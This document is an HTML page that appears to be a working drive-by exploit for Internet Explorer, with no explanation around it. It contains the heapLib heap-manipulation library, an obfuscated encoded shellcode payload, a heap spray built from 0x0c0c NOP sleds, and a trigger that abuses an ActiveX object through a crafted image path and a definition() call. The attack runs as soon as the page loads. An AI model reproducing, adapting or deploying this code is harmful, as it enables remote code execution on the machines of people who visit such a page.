<html>
<head>
<script>

function heapLib() {
}




heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    
    this.mem = new Array();

    
    this.flushOleaut32();
}




heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}




heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}




heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}




heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}




heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}




heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}




heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}




heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}




heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    
    CollectGarbage();
}




heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    

    this.freeOleaut32("oleaut32");
    
    

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}




heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    
    this.allocOleaut32(arg, tag);
}



heapLib.ie.prototype.free = function(tag) {

    
    this.freeOleaut32(tag);

    
    this.flushOleaut32();
}




heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}




heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}




heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}




heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}




heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}

var heap_obj = new heapLib.ie(0x20000);

var tkscctv = "%ud5db%uC9C9%u87CD%u9292%uDBCB%u93CC%uD6D4%uDFCA%uFE93%uF0F2%u8587%u9284%u92D2%uD5DF%uD893%uD8C5";
var tksccav = "%XNuBXNDBXND%uBDBXND%uBDBXND%uBDBD%uBDBXND%uBXNDBD%uBDBXND%uBDBXND%uEAEA";
tksccav = (tksccav.replace(/XN/g,""));

var codecode = "XN5858XN5858XN10EBXN4B5BXNC933"+"XNB966XN03B8XN3480XNBD0BXNFAE2XN05EBXNEBE8XNFFFFXN54FFXNBEA3XNBDBDXND9E2XN8D1CXNBDBDXN36BDXNB1FDXNCD36XN10A1XND536XN36B5XND74AXNE4ACXN0355XNBDBFXN2DBDXN455FXN8ED5XNBD8FXND5BDXNCEE8XNCFD8XN36E9XNB1FBXN0355XNBDBCXN36BDXND755XNE4B8XN2355XNBDBFXN5FBDXND544XND3D2XNBDBDXNC8D5XND1CFXNE9D0XNAB42XN7D38XNAEC8XND2D5XNBDD3XND5BDXNCFC8XND0D1XN36E9XNB1FBXN3355XNBDBCXN36BDXND755XNE4BCXND355XNBDBFXN5FBDXND544XN8ED1XNBD8FXNCED5XND8D5XNE9D1XNFB36XN55B1XNBCD2XNBDBDXN5536XNBCD7XN55E4XNBFF2XNBDBDXN445FXN513CXNBCBDXNBDBDXN6136XN7E3CXNBD3DXNBDBDXNBDD7XNA7D7XND7EEXN42BDXNE1EBXN7D8EXN3DFDXNBE81XNC8BDXN7A44XNBEB9XNDBE1XND893XNF97AXNB9BEXND8C5XNBDBDXN748EXNECECXNEAEEXN8EECXN367DXNE5FBXN9F55XNBDBCXN3EBDXNBD45XN1E54XNBDBDXN2DBDXNBDD7XNBDD7XNBED7XNBDD7XNBFD7XNBDD5XNBDBDXNEE7DXNFB36XN5599XNBCBCXNBDBDXNFB34XND7DDXNEDBDXNEB42XN3495XND9FBXNFB36XND7DDXND7BDXND7BDXND7BDXND7B9XNEDBDXNEB42XND791XND7BDXND7BDXND5BDXNBDA2XNBDB2XN42EDXN81EBXNFB34XN36C5XND9F3XNC13DXN42B5XNC909XN3DB1XNB5C1XNBD42XNB8C9XNC93DXN42B5XN5F09XN3456XN3D3BXNBDBDXN7ABDXNCDFBXNBDBDXNBDBDXNFB7AXNBDC9XNBDBDXND7BDXND7BDXND7BDXN36BDXNDDFBXN42EDXN85EBXN3B36XNBD3DXNBDBDXNBDD7XNF330XNECC9XNCB42XNEDCDXNCB42XN42DDXN8DEBXNCB42XN42DDXN89EBXNCB42XN42C5XNFDEBXN4636XN7D8EXN668EXN513CXNBFBDXNBDBDXN7136XN453EXNC0E9XN34B5XNBCA1XN7D3EXN56B9XN364EXN3671XN3E64XNAD7EXN7D8EXNECEDXNEDEEXNEDEDXNEDEDXNEAEDXNEDEDXNEB42XN36B5XNE9C3XNAD55XNBDBCXN55BDXNBDD8XNBDBDXNDED5XNCACBXND5BDXND5CEXND2D9XN36E9XNB1FBXN9955XNBDBDXN34BDXN81FBXN1CD9XNBDB9XNBDBDXN1D30XN42DDXN4242XND8D7XNCB42XN3681XNADFBXNB555XNBDBDXN8EBDXNEE66XNEEEEXN42EEXN3D6DXN5585XN853DXNC854XN3CACXNB8C5XN2D2DXN2D2DXNB5C9XN4236XN36E8XN3051XNB8FDXN5D42XN1B55XNBDBDXN7EBDXN1D55XNBDBDXN05BDXNBCACXN3DB9XNB17FXN55BDXNBD2EXNBDBDXN513CXNBCBDXNBDBDXN4136XN7A3EXN7AB9XN8FBAXN2CC9XN7AB1XNB9FAXN34DEXNF26CXNFA7AXN1DB5XN2AD8XN7A76XNB1FAXNFDECXNC207XNFA7AXN83ADXN0BA0XN7A84XNA9FAXND405XNA669XNFA7AXN03A5XNDBC2XN7A1DXNA1FAXN1441XN108AXNFA7AXN259DXNADB7XND945XN8D1CXNBDBDXN36BDXNB1FDXNCD36XN10A1XND536XN36B5XND74AXNE4B9XNE955XNBDBDXN2DBDXN455FXN8ED5XNBD8FXND5BDXNCEE8XNCFD8XN36E9XN55BBXN42E8XN4242XN5536XNB8D7XN55E4XNBD88"+"XNBDBDXN445FXN428EXN42EAXNB9EBXNBF56XN7EE5XN4455XN4242XNE642XNBA7BXN3405XNBCE2XN7ADBXNB8FAXN5D42XNEE7EXN6136XND7EEXND5FDXNADBDXNBDBDXN36EAXN9DFBXNA555XN4242XNE542XNEC7EXN36EBXN81C8XNC936XNC593XN48BEXN36EBXN9DCBXN48BEXN748EXNFCF4XNBE10XN8E78XNB266XNAD03XN6B87XNB5C9XN767CXNBEBAXNFD67XN4C56XNA286XN5AC8XN36E3XN99E3XN60BEXN36DBXNF6B1XNE336XNBEA1XN3660XN36B9XN78BEXNE316XN7EE4XN6055XN4241XN0F42XN5F4FXN8449XNC05FXN673EXNC6F5XN8F80XN2CC9XN38B1XN1262XNDE06XN6C34XNECF2XN07FDXN1DC2XN2AD8XNA376XND919XN2E52XN598FXN3329XNB7AEXN7F11XNF6A4XN79BCXNA230XNEAC9XNB0DBXNFE42XN1103XNC066XN184DXNEF27XN1A43XN8367XN0BA0XN0584XN69D4XN03A6XNDBC2XN411DXN8A14XN2510XNADB7XN3D45XN126BXN4627XNA8EE" ;

var code =(codecode.replace(/XN/g,"%u"))+ tkscctv+tksccav;

code =unescape(code);
var nops = unescape("%u0c0c%u0c0c");

while (nops.length < 0x80000) nops += nops;

var offset = nops.substring(0, 0x100);
var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="VPMD"></object>
<script>
var obj = document.getElementById('VPMD').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(764);
</script>
</body>
</html>
